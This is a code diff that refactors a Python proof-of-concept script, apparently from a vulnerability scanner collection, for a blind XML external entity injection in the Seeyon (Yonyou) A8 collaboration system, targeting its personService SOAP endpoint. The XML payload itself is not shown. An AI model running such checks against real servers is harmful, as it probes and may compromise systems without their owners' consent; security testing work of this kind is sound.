@@ -13,14 +13,7 @@ import hashlib
 import datetime
 import requests
 import warnings
-  
-
-
-class a8_personService_xxe:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['用友致远A8协同系统 Blind XML实体注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
@@ -28,7 +21,7 @@ class a8_personService_xxe:
             "Content-Type":"application/xml"
         }
         payload = "/seeyon/services/personService.personServiceHttpSoap11Endpoint"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         time_stamp = time.mktime(datetime.datetime.now().timetuple())
         m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
         md5_str = m.hexdigest()
@@ -50,5 +43,5 @@ class a8_personService_xxe:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = a8_personService_xxe(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
